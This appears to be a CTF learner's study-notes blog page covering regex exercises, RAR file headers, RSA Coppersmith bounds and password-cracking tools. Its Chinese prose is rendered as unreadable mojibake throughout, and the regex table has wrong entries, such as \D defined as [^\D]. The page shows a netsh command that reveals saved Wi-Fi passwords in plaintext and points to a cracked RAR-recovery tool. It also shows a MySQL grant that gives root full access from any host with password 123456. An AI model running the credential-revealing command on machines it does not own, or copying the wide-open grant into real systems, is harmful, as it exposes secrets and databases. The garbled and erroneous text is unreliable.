<li>ä½¿ç”¨å¼•ç”¨ä½œä¸ºifæ¡ä»¶</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">( &lt;A\s+[^&gt;]+&gt; \s* )? # åŒ¹é…å¼€å¤´çš„&lt;A&gt; tag, å¦‚æœå­˜åœ¨çš„è¯</span><br><span class="line">&lt;IMG\s+[^&gt;]+&gt; # åŒ¹é…&lt;IMG&gt; tag</span><br><span class="line">(?(1)\s*&lt;/A&gt;) # åŒ¹é…ç»“å°¾çš„&lt;/A&gt;, å¦‚æœä¹‹å‰åŒ¹é…è¿‡&lt;A&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨ç¯è§†ç»“æ„ä½œä¸ºifæ¡ä»¶</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(?(?&lt;=NUM:)\d+|\w+)  // å®ƒä¼šåœ¨NUM: ä¹‹åçš„ä½ç½®å°è¯•åŒ¹é…\d+, ä½†æ˜¯åœ¨å…¶ä»–ä½ç½®å°è¯•ä½¿ç”¨\w+</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="è½¬ä¹‰ç¬¦"><a href="#è½¬ä¹‰ç¬¦" class="headerlink" title="è½¬ä¹‰ç¬¦"></a>è½¬ä¹‰ç¬¦</h3><p>åœ¨å…ƒå­—ç¬¦å‰é¢ä½¿ç”¨åæ–œçº¿ç§°ä¸º<strong>è½¬ä¹‰ç¬¦</strong>ã€‚</p>
<ul>
<li><code>\.</code> è½¬ä¹‰ç‚¹å·ï¼Œä½¿å®ƒå¤±å»å…ƒå­—ç¬¦çš„å«ä¹‰ï¼Œè¡¨ç¤ºä¸€ä¸ªæ™®é€šçš„ç‚¹å·å­—ç¬¦</li>
<li><code>\(</code> è½¬ä¹‰åœ†æ‹¬å·ï¼Œä½¿å®ƒå¤±å»åˆ†ç»„çš„ä½œç”¨ï¼Œä½œä¸ºæ™®é€šå­—ç¬¦çš„å­—ç¬¦</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\([a-zA-Z]+\) åŒ¹é…åœ¨ä¸€ä¸ªæ‹¬å·å†…çš„å•è¯å¦‚: (very)</span><br></pre></td></tr></table></figure>

<h3 id="ç¯è§†ç»“æ„"><a href="#ç¯è§†ç»“æ„" class="headerlink" title="ç¯è§†ç»“æ„"></a>ç¯è§†ç»“æ„</h3><p>ç¯è§†ç»“æ„ä¸å ç”¨å­—ç¬¦ï¼ŒåªåŒ¹é…æ–‡æœ¬ä¸­çš„ç‰¹å®šä½ç½®ï¼Œç±»ä¼¼ä¸^åŒ¹é…è¡Œçš„å¼€å¤´ä½ç½®</p>
<ul>
<li><code>(?=)</code> è‚¯å®šé¡ºåºç¯è§†ï¼Œå­è¡¨è¾¾å¼èƒ½å¤ŸåŒ¹é…å³ä¾§æ–‡æœ¬åˆ™åŒ¹é…ä½ç½®æˆåŠŸ</li>
<li><code>(?!)</code> å¦å®šé¡ºåºç¯è§†ï¼Œå­è¡¨è¾¾å¼ä¸èƒ½åŒ¹é…å³ä¾§æ–‡æœ¬åˆ™åŒ¹é…ä½ç½®æˆåŠŸ</li>
<li><code>(?&lt;=)</code> è‚¯å®šé€†åºç¯è§†ï¼Œå­è¡¨è¾¾å¼èƒ½å¤ŸåŒ¹é…å·¦ä¾§æ–‡æœ¬åˆ™åŒ¹é…ä½ç½®æˆåŠŸ</li>
<li><code>(?&lt;!)</code> å¦å®šé€†åºç¯è§†ï¼Œå­è¡¨è¾¾å¼ä¸èƒ½åŒ¹é…å·¦ä¾§æ–‡æœ¬åˆ™åŒ¹é…ä½ç½®æˆåŠŸ</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s/\bJeffs\b/Jeff&#x27;s/g  æœ€ç®€å•ç›´æ¥çš„æ–¹æ³•</span><br><span class="line">s/\b(Jeff)(s)\b/$1&#x27;$2/g   è¿‡äºå¤æ‚</span><br><span class="line">s/\bJeff(?=s\b)/Jeff&#x27;/g  ä½¿ç”¨äº†é¡ºåºç¯è§†ï¼ŒåŒ¹é…åˆ°så·¦è¾¹çš„ä½ç½®</span><br><span class="line">s/(?&lt;=\bJeff)(?=s\b)/&#x27;/g åŒæ—¶ä½¿äº†é¡ºåºç¯è§†å’Œé€†åºç¯è§†ï¼ŒåŒ¹é…åˆ°&#x27;æ’å…¥çš„ä½ç½®</span><br><span class="line">s/(?=s\b)(?&lt;=\bJeff)/&#x27;/g ä¸ä¸Šé¢çš„æ­£åˆ™ç›¸åŒï¼Œåªæ˜¯é¢ å€’äº†ä¸¤ä¸ªç¯è§†ç»“æ„çš„é¡ºåºåŒ¹é…ç»“æœä¸å—å½±å“</span><br></pre></td></tr></table></figure>

<p><strong>TIPSï¼š</strong></p>
<ul>
<li><code>\b</code> åœ¨ä¸Šé¢çš„æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºå•è¯åˆ†ç•Œç¬¦</li>
<li><code>$1</code> åœ¨Perlç¼–ç¨‹è¯­è¨€ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºåå‘å¼•ç”¨ç¬¬ä¸€ä¸ªæ‹¬å·åŒ¹é…çš„å†…å®¹</li>
</ul>
<h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gr[ea]y</span><br><span class="line">   è§£è¯»ï¼šå…ˆæ‰¾åˆ°gï¼Œæ¥ç€æ˜¯ä¸€ä¸ªrï¼Œç„¶åæ˜¯ä¸€ä¸ªaæˆ–è€…eï¼Œæœ€åæ˜¯ä¸€ä¸ªyã€‚</span><br><span class="line">   ä¸éš¾çœ‹å‡º[Â·Â·Â·]å­—ç¬¦ç»„å…ƒå­—ç¬¦ï¼Œä»£è¡¨çš„æ„æ€æ˜¯æˆ–ï¼Œæ›´å‡†ç¡®çš„è¯´ï¼šèƒ½å¤ŸåŒ¹é…å­—ç¬¦ç»„å†…åˆ—å‡ºçš„ä»»æ„</span><br><span class="line">   å­—ç¬¦ï¼Œè¿™æ ·ä¸€æ¥å°±å¯ä»¥æŠŠæ­£åˆ™è¡¨è¾¾å¼å†™çš„æ›´åŠ ä¼˜ç¾ç®€æ´ã€‚ä½†æ˜¯è€ƒè™‘åˆ°greycolorä¹Ÿæ˜¯åŒ¹é…çš„ï¼Œæˆ‘</span><br><span class="line">   ä»¬å¯ä»¥ç”¨ä¸Š \&lt; å’Œ \&gt; ç»„åˆå…ƒå­—ç¬¦ï¼Œæ¥é”šå®šå•è¯çš„å¼€å§‹å’Œç»“æŸã€‚ä¿®æ”¹åçš„æ­£åˆ™è¡¨è¾¾å¼å¦‚ä¸‹ï¼š</span><br><span class="line">   \&lt;gr[ea]y\&gt;</span><br><span class="line"></span><br><span class="line">   å­—ç¬¦ç»„å…ƒå­—ç¬¦èƒ½è§£å†³å¾ˆå¤šé—®é¢˜ï¼Œ</span><br><span class="line">   1. [Ss]imonå¯ä»¥ç”¨æ¥è§£å†³å¤§å°å†™çš„é—®é¢˜</span><br><span class="line">   2. å¦‚æœæˆ‘æƒ³åŒ¹é…0-9ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦æˆ‘å¯ä»¥å¾ˆå¿«çš„å†™å‡º:</span><br><span class="line">   [0123456789] // è¯´å¥½çš„ç®€æ´ä¼˜ç¾å‘¢ï¼Ÿ </span><br><span class="line">   [0-9] //ä¼˜åŒ–åï¼Œæ€ä¹ˆè¿˜ä¸å¤Ÿä¼˜åŒ–ï¼Ÿ</span><br><span class="line">   \d //è¿™ä¸ªæ•´ä½“ç®—æ˜¯ä¸€ä¸ªå…ƒå­—ç¬¦ï¼Œä½†æ˜¯å®ƒç”±ä¸¤ä¸ªå­—ç¬¦ç»„æˆï¼Œå¯ä»¥ç§°ä¸ºï¼šç»„åˆå…ƒå­—ç¬¦ï¼Œç­‰ä»·äº[0-9]</span><br></pre></td></tr></table></figure>

<h2 id="æŸ¥çœ‹æ— çº¿ç½‘å¯†ç "><a href="#æŸ¥çœ‹æ— çº¿ç½‘å¯†ç " class="headerlink" title="æŸ¥çœ‹æ— çº¿ç½‘å¯†ç "></a>æŸ¥çœ‹æ— çº¿ç½‘å¯†ç </h2><ul>
<li><p><code>netsh wlan show profile</code></p>
</li>
<li><p><code>netsh wlan export profile folder=D:\ key=clear</code></p>
</li>
<li><p><code>netsh wlan show profile [WiFiåç§°] key=clear</code></p>
</li>
</ul>
<h2 id="äºŒç»´ç çš„ç‰ˆæœ¬é—®é¢˜"><a href="#äºŒç»´ç çš„ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="äºŒç»´ç çš„ç‰ˆæœ¬é—®é¢˜"></a>äºŒç»´ç çš„ç‰ˆæœ¬é—®é¢˜</h2><p>äºŒç»´ç å®˜æ–¹å«ç‰ˆæœ¬ä¸ºVersionã€‚<br>äºŒç»´ç ä¸€å…±æœ‰40ä¸ªå°ºå¯¸ã€‚Version 1æ˜¯21 x 21çš„çŸ©é˜µï¼ŒVersion 2æ˜¯ 25 x 25çš„çŸ©é˜µï¼ŒVersion 3æ˜¯29çš„å°ºå¯¸ï¼Œæ¯å¢åŠ ä¸€ä¸ªversionï¼Œå°±ä¼šå¢åŠ 4çš„å°ºå¯¸ï¼Œå…¬å¼æ˜¯ï¼š(V-1)*4 + 21ï¼ˆVæ˜¯ç‰ˆæœ¬å·ï¼‰æœ€é«˜Version 40ï¼Œ(40-1)*4+21 &#x3D; 177ï¼Œæ‰€ä»¥æœ€é«˜æ˜¯177 x 177 çš„æ­£æ–¹å½¢ã€‚</p>
<p>version2 äºŒç»´ç çš„æ ‡å‡†å¤§å°åº”è¯¥æ˜¯25x25ã€‚æƒ³åˆ°é›¶å®½å­—èŠ‚éšå†™ã€‚</p>
<h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><h3 id="rar5-0åŠ å¯†"><a href="#rar5-0åŠ å¯†" class="headerlink" title="rar5.0åŠ å¯†"></a>rar5.0åŠ å¯†</h3><p>ä¸Šé¢è¯´çš„ä¸¤ç§å·¥å…·æ²¡åŠæ³•ç ´è§£rar5.0çš„åŠ å¯†ï¼Œä¸è¿‡å¯ä»¥ç”¨ç ´è§£ç‰ˆçš„<code>Accent RAR Password Recovery</code>è¿›è¡Œçˆ†ç ´ï¼Œè¿™ä¸ªå·¥å…·ä¹Ÿæ”¯æŒæš´åŠ›ç ´è§£ã€æ©ç çˆ†ç ´ã€å­—å…¸çˆ†ç ´ã€‚</p>
<p>æˆ–è€…å…ˆç”¨johnè·å–raræ–‡ä»¶çš„hashå€¼ï¼Œå†ç”¨<code>hashcat</code>çˆ†ç ´</p>
<h3 id="raræ–‡ä»¶æ ¼å¼"><a href="#raræ–‡ä»¶æ ¼å¼" class="headerlink" title="raræ–‡ä»¶æ ¼å¼"></a>raræ–‡ä»¶æ ¼å¼</h3><blockquote>
<p><a href="https://www.rarlab.com/technote.htm#filehead">RAR 5.0 archive format (rarlab.com)</a></p>
</blockquote>
<p>ä¸‹é¢çš„æ–‡ä»¶æ ¼å¼åˆ†ææ˜¯åŸºäºRAR4.xï¼Œå¹¶ä¸æ˜¯RAR5.0<br>RAR 5.0ç­¾åå’ŒRAR4.xçš„ç­¾åä¸ä¸€æ ·<br>RAR 5.0ç­¾åç”±8ä¸ªå­—èŠ‚ç»„æˆ:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00<br>æ¯”è¾ƒä¸€ä¸‹<br>RAR 4.x ç­¾åç”±7å­—èŠ‚ç»„æˆ:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x00</p>
<ul>
<li>å¸¸è§çš„å—</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ‡è®°å—ï¼šHEAD_TYPE=0x72</span><br><span class="line">å‹ç¼©æ–‡ä»¶å¤´ï¼šHEAD_TYPE=0x73</span><br><span class="line">æ–‡ä»¶å¤´ï¼šHEAD_TYPE=0x74</span><br><span class="line">æ—§é£æ ¼çš„æ³¨é‡Šå¤´ï¼šHEAD_TYPE=0x75</span><br><span class="line">æ—§é£æ ¼çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼šHEAD_TYPE=0x76</span><br><span class="line">æ—§é£æ ¼çš„å­å—ï¼šHEAD_TYPE=0x77</span><br><span class="line">æ—§é£æ ¼çš„æ¢å¤è®°å½•ï¼šHEAD_TYPE=0X78</span><br><span class="line">æ—§é£æ ¼çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼šHEAD_TYPE=0X79</span><br><span class="line">å­å—ï¼šHEAD_TYPE=0x7A</span><br><span class="line">æœ€åçš„ç»“æŸå—ï¼šHEAD_TYPE=0x7B</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Kaliè‡ªå¸¦å¯†ç å­—å…¸rockyou-txtè§£å‹"><a href="#Kaliè‡ªå¸¦å¯†ç å­—å…¸rockyou-txtè§£å‹" class="headerlink" title="Kaliè‡ªå¸¦å¯†ç å­—å…¸rockyou.txtè§£å‹"></a>Kaliè‡ªå¸¦å¯†ç å­—å…¸rockyou.txtè§£å‹</h2><h2 id="æ‰¾ä½ç½®"><a href="#æ‰¾ä½ç½®" class="headerlink" title="æ‰¾ä½ç½®"></a>æ‰¾ä½ç½®</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/wordlists</span><br></pre></td></tr></table></figure>

<h3 id="wordlistsä¸­è§£å‹"><a href="#wordlistsä¸­è§£å‹" class="headerlink" title="wordlistsä¸­è§£å‹"></a>wordlistsä¸­è§£å‹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><blockquote>
<p><a href="https://www.cnblogs.com/Junglezt/p/16048189.html">å¯†ç ç ´è§£-johnçš„ä½¿ç”¨ - Junglezt - åšå®¢å›­ (cnblogs.com)</a></p>
</blockquote>
<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><blockquote>
<p><a href="https://www.cnblogs.com/Junglezt/p/16044372.html">å¯†ç ç ´è§£-hashcatçš„ç®€å•ä½¿ç”¨ - Junglezt - åšå®¢å›­ (cnblogs.com)</a></p>
<p>[example_hashes <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat wiki]</a></p>
<p><a href="https://hashcat.net/hashcat/">hashcat - advanced password recovery</a></p>
</blockquote>
<p>ä¿®æ”¹å†…æ ¸ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230629171009428.png" class="" title="image-20230629171009428">

<img src="/2023/12/31/WeeklyStudy/image-20230629171043066.png" class="" title="image-20230629171043066">

<h1 id="230803"><a href="#230803" class="headerlink" title="230803"></a>230803</h1><h2 id="coppersmithä¸‹é™"><a href="#coppersmithä¸‹é™" class="headerlink" title="coppersmithä¸‹é™"></a>coppersmithä¸‹é™</h2><img src="/2023/12/31/WeeklyStudy/image-20230803144033492.png" class="" title="image-20230803144033492">

<img src="/2023/12/31/WeeklyStudy/image-20230803144106079.png" class="" title="image-20230803144106079">

<img src="/2023/12/31/WeeklyStudy/image-20230803144137890.png" class="" title="image-20230803144137890">

<img src="/2023/12/31/WeeklyStudy/image-20230803144155489.png" class="" title="image-20230803144155489">

<img src="/2023/12/31/WeeklyStudy/image-20230803144224670.png" class="" title="image-20230803144224670">

<img src="/2023/12/31/WeeklyStudy/image-20230803144334288.png" class="" title="image-20230803144334288">



<ul>
<li><p>åœ¨<code>sagemath</code>ä¸­åº”ç”¨<code>coppersmith</code>å®šç†çš„å‡½æ•°æœ‰ä¸¤ä¸ªï¼š<code>small_roots</code>ï¼Œ <code>coppersmith_howgrave_univariate</code>ã€‚</p>
</li>
<li><p>è¿™é‡Œæ±‚è§£coppersmithæˆ‘ä»¬ç»Ÿä¸€ä½¿ç”¨sagemathçš„<code>small_roots()</code>å‡½æ•°ï¼›è¯¥å‡½æ•°å¯¼å…¥çš„ $\beta$èµ·ä½œç”¨çš„åªæœ‰ä¸€ä½å°æ•°ï¼ˆå¦‚æœæ˜¯ä¸¤ä½å°æ•°ï¼Œå…¶æ±‚è§£èŒƒå›´è¿˜æ˜¯ç›¸å½“äºä¸€ä½å°æ•°çš„æ±‚è§£èŒƒå›´ï¼‰ï¼Œè¿™å°±æ„å‘³ç€ä¸€èˆ¬å½¢å¦‚<code>p = getPrime(bits)</code>,<code>q = geyPrime(bits)</code>çš„RSAåº”ç”¨<code>coppersmith</code>æ±‚è§£$p$çš„ä½ä½æ—¶ï¼Œ$\beta$åªèƒ½æ˜¯æœ€æ¥è¿‘$0.5$ çš„$0.4$ã€‚</p>
</li>
</ul>
<p>å…³äº<code>small_roots()</code>çš„ä½¿ç”¨æ–¹æ³•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">small_roots(X = ,beta = ) æœ‰ä¸¤ä¸ªå‚æ•°</span><br></pre></td></tr></table></figure>

<p>$X$ä»£è¡¨æ‰€éœ€è¦æ±‚è§£æ ¹çš„ä¸Šé™ï¼›è™½ç„¶æ˜¯æ ¹çš„ä¸Šé™ï¼Œå¹¶ä¸æ˜¯è¯´ä¸Šé™è¶Šé«˜è¶Šå¥½ï¼Œå½“ä¸Šé™è¶…è¿‡æŸä¸ªå€¼çš„æ—¶å€™å°±ä¼šè®¡ç®—å¤±æ•ˆï¼Œå³ä½¿å·²çŸ¥äºŒè¿›åˆ¶ä½æ•°æ»¡è¶³æ¡ä»¶ï¼Œä¹Ÿæ— æ³•ç”¨æ­¤å‡½æ•°æ±‚å¾—ç»“æœï¼›æ‰€ä»¥ä¸€èˆ¬æ¥è¯´$X$å–åœ¨ç»™å®šæƒ…å†µä¸‹çš„æœ€å¤§æ±‚è§£ä¸Šé™ã€‚</p>
<p>$beta$å³æ˜¯å‰é¢æåˆ°çš„$\beta$ ï¼Œå½“$p$,$q$äºŒè¿›åˆ¶ä½æ•°ç›¸åŒæ—¶ä¸€èˆ¬åªèƒ½å–$0.4$ï¼›å¦‚æœ$p$,$q$äºŒè¿›åˆ¶ä½æ•°ä¸åŒï¼Œå°±æŒ‰ç…§ä¹‹å‰çš„æ–¹æ³•å…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚</p>
<p>ç»è¿‡æµ‹è¯•å¾—åˆ°ï¼Œå½“æœªçŸ¥é‡å°äºç­‰äº$454bits$æ—¶ï¼ˆ$p$,$q$ä¸º$1024bits$ï¼‰ï¼Œcoppersmithå®šç†å¯ä»¥æ±‚è§£</p>
<p>ä¹‹åæ”¹å˜äº†$p$,$q$çš„å¤§å°ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œå½“$p$,$q$åŒäºŒè¿›åˆ¶ä½æ•°æ—¶ï¼Œè¦ä½¿ç”¨<code>small_roots()</code>åº”ç”¨<code>coppersmith</code>å®šç†æ±‚è§£$n$çš„æŸä¸ªå› æ•°çš„ä½ä½ï¼Œéœ€è¦æ»¡è¶³æœªçŸ¥çš„äºŒè¿›åˆ¶ä½æ•°ä¸å› æ•°ä¹‹é—´çš„äºŒè¿›åˆ¶ä½æ•°çš„å…³ç³»æ˜¯ï¼š<br>$$<br>bits_{unknown} \div bits_{p} &lt; &#x3D; 0.44<br>$$</p>
<h1 id="230807"><a href="#230807" class="headerlink" title="230807"></a>230807</h1><img src="/2023/12/31/WeeklyStudy/image-20230808093951590.png" class="" title="image-20230808093951590">

<img src="/2023/12/31/WeeklyStudy/image-20230808094022608.png" class="" title="image-20230808094022608">



<h1 id="230808"><a href="#230808" class="headerlink" title="230808"></a>230808</h1><h2 id="mysqlèµ‹æƒæ“ä½œ"><a href="#mysqlèµ‹æƒæ“ä½œ" class="headerlink" title="mysqlèµ‹æƒæ“ä½œ"></a>mysqlèµ‹æƒæ“ä½œ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure>

<ul>
<li>GRANTï¼šèµ‹æƒå‘½ä»¤</li>
<li>ALL PRIVILEGESï¼šå½“å‰ç”¨æˆ·çš„æ‰€æœ‰æƒé™</li>
<li>ONï¼šä»‹è¯</li>
<li><code>*.*</code>ï¼šå½“å‰ç”¨æˆ·å¯¹æ‰€æœ‰æ•°æ®åº“å’Œè¡¨çš„ç›¸åº”æ“ä½œæƒé™</li>
<li>TOï¼šä»‹è¯</li>
<li><code>&#39;root&#39;@&#39;%&#39;</code>ï¼šæƒé™èµ‹ç»™rootç”¨æˆ·ï¼Œæ‰€æœ‰ipéƒ½èƒ½è¿æ¥</li>
<li>IDENTIFIED BY â€˜123456â€™ï¼šè¿æ¥æ—¶è¾“å…¥å¯†ç ï¼Œå¯†ç ä¸º123456</li>
<li>WITH GRANT OPTIONï¼šå…è®¸çº§è”èµ‹æƒ</li>
</ul>
<h2 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h2><p>ç»ƒä¹ ç½‘ç«™ï¼š</p>
<p><a href="https://alf.nu/RegexGolf">Regex Golf (alf.nu)</a></p>
<p><a href="https://regexone.com/">RegexOne - Learn Regular Expressions - Lesson 1: An Introduction, and the ABCs</a></p>
<p>å‚è€ƒç­”æ¡ˆï¼š</p>
<p><a href="https://blog.csdn.net/NJYR21/article/details/79600217">Regex Golf æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ ï¼ˆæŒç»­æ›´æ–°ï¼‰_regex golfçš„it never ends_NJYR21çš„åšå®¢-CSDNåšå®¢</a></p>
<p><a href="https://blog.csdn.net/weixin_47532216/article/details/122615843?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122615843-blog-79600217.235%5Ev38%5Epc_relevant_sort&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122615843-blog-79600217.235%5Ev38%5Epc_relevant_sort&utm_relevant_index=2">æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ (Regex Golf)_regex golfç­”æ¡ˆ_å¼ºå¼ºå­¦ä¹ çš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="gitç»ƒä¹ "><a href="#gitç»ƒä¹ " class="headerlink" title="gitç»ƒä¹ "></a>gitç»ƒä¹ </h2><p><a href="https://learngitbranching.js.org/">Learn Git Branching</a></p>
<h2 id="æ•™ç¨‹"><a href="#æ•™ç¨‹" class="headerlink" title="æ•™ç¨‹"></a>æ•™ç¨‹</h2><p><a href="https://gitcode.net/mirrors/ziishaned/learn-regex/-/blob/master/translations/README-cn.md">translations&#x2F;README-cn.md Â· master Â· mirrors &#x2F; ziishaned &#x2F; learn-regex Â· GitCode</a></p>
<h1 id="230809-230810"><a href="#230809-230810" class="headerlink" title="230809-230810"></a>230809-230810</h1><h2 id="æ­£åˆ™åŒ¹é…ç»ƒä¹ -RegexOne"><a href="#æ­£åˆ™åŒ¹é…ç»ƒä¹ -RegexOne" class="headerlink" title="æ­£åˆ™åŒ¹é…ç»ƒä¹ -RegexOne"></a>æ­£åˆ™åŒ¹é…ç»ƒä¹ -RegexOne</h2><blockquote>
<p><a href="https://regexone.com/problem/complete">RegexOne - Learn Regular Expressions - Problem X: Infinity and beyond!</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230810101245480.png" class="" title="image-20230810101245480">

<table>
<thead>
<tr>
<th>ç®€å†™</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>é™¤æ¢è¡Œç¬¦å¤–çš„æ‰€æœ‰å­—ç¬¦</td>
</tr>
<tr>
<td>\w</td>
<td>åŒ¹é…æ‰€æœ‰å­—æ¯æ•°å­—ï¼Œç­‰ä»·äº[a-zA-Z0-9_]</td>
</tr>
<tr>
<td>\W</td>
<td>åŒ¹é…æ‰€æœ‰éå­—æ¯æ•°å­—ï¼Œå³ç¬¦å·ï¼Œç­‰ä»·äº<code>[^\w]</code></td>
</tr>
<tr>
<td>\d</td>
<td>åŒ¹é…æ•°å­—[0-9]</td>
</tr>
<tr>
<td>\D</td>
<td>åŒ¹é…æ‰€æœ‰éæ•°å­—ï¼Œç­‰ä»·äº<code>[^\D]</code></td>
</tr>
<tr>
<td>\s</td>
<td>åŒ¹é…æ‰€æœ‰ç©ºæ ¼å­—ç¬¦ï¼Œç­‰ä»·äº<code>[\t\n\f\r\p&#123;Z&#125;]</code></td>
</tr>
<tr>
<td>\S</td>
<td>åŒ¹é…æ‰€æœ‰éç©ºæ ¼å­—ç¬¦ï¼Œç­‰ä»·äº<code>[^\s]</code></td>
</tr>
<tr>
<td>\f</td>
<td>åŒ¹é…ä¸€ä¸ªæ¢é¡µç¬¦</td>
</tr>
<tr>
<td>\n</td>
<td>åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦</td>
</tr>
<tr>
<td>\r</td>
<td>åŒ¹é…ä¸€ä¸ªå›è½¦ç¬¦</td>
</tr>
<tr>
<td>\t</td>
<td>åŒ¹é…ä¸€ä¸ªåˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td>\v</td>
<td>åŒ¹é…ä¸€ä¸ªå‚ç›´åˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td>\p</td>
<td>åŒ¹é… CR&#x2F;LFï¼ˆç­‰åŒäº \r\n ï¼‰ï¼Œç”¨æ¥åŒ¹é… DOS è¡Œç»ˆæ­¢ç¬¦</td>
</tr>
</tbody></table>
<img src="/2023/12/31/WeeklyStudy/image-20230809131141276.png" class="" title="image-20230809131141276">

<ul>
<li><code>123</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809111936370.png" class="" title="image-20230809111936370">

<ul>
<li><code>\.</code></li>
<li><code>...\.</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809111113077.png" class="" title="image-20230809111113077">

<ul>
<li><code>[cmf]an</code></li>
<li><code>[^drp]an</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110854701.png" class="" title="image-20230809110854701">

<ul>
<li><code>[^b]og</code></li>
<li><code>[hd]og</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110635758.png" class="" title="image-20230809110635758">

<ul>
<li><code>[A-Z][nop][a-c]</code></li>
<li><code>[A-Z]</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110556161.png" class="" title="image-20230809110556161">

<ul>
<li><code>waz&#123;3,5&#125;up</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110354476.png" class="" title="image-20230809110354476">

<ul>
<li><code>a+b*c+</code></li>
<li><code>aa</code></li>
<li><code>a&#123;2,4&#125;b&#123;0,4&#125;c&#123;1,2&#125;</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809133748274.png" class="" title="image-20230809133748274">

<ul>
<li><code>[0-9]\sfile(s|\s)</code></li>
<li><code>\d+ files? found\?</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809144844315.png" class="" title="image-20230809144844315">

<ul>
<li><code>\d\.\s+abc</code></li>
<li><code>[\s]</code></li>
<li><code>[^\S]</code></li>
<li><code>[0-9]\.\s+[a-c]+</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809160628468.png" class="" title="image-20230809160628468">

<ul>
<li><code>(^M)[a-z]+: \w+</code></li>
<li><code>(^M)\w+: \w+</code></li>
<li><code>^Mission: successful$</code></li>
<li><code>(^Mission): [a-z]+</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809161813119.png" class="" title="image-20230809161813119">

<ul>
<li><code>^(file.+)\.pdf</code></li>
<li><code>^(file.*)\.pdf</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809162757458.png" class="" title="image-20230809162757458">

<ul>
<li><code>(\w+\s(\d+))</code></li>
<li><code>(\w+ (\d+))</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810092448218.png" class="" title="image-20230810092448218">



<img src="/2023/12/31/WeeklyStudy/image-20230810093941579.png" class="" title="image-20230810093941579">



<img src="/2023/12/31/WeeklyStudy/image-20230810095458650.png" class="" title="image-20230810095458650">

<ul>
<li><code>[^p]$</code></li>
<li><code>^-?\d+(,\d+)*(\.\d+(e\d+)?)?$</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810102154899.png" class="" title="image-20230810102154899">

<ul>
<li><code>(\d&#123;3&#125;)</code></li>
<li><code>1?[\s-]?\(?(\d&#123;3&#125;)\)?[\s-]?\d&#123;3&#125;[\s-]?\d&#123;4&#125;</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810111454324.png" class="" title="image-20230810111454324">

<ul>
<li><code>^([\.\w]*)</code></li>
<li><code>^([\.\w]*)[\W\w]+$</code></li>
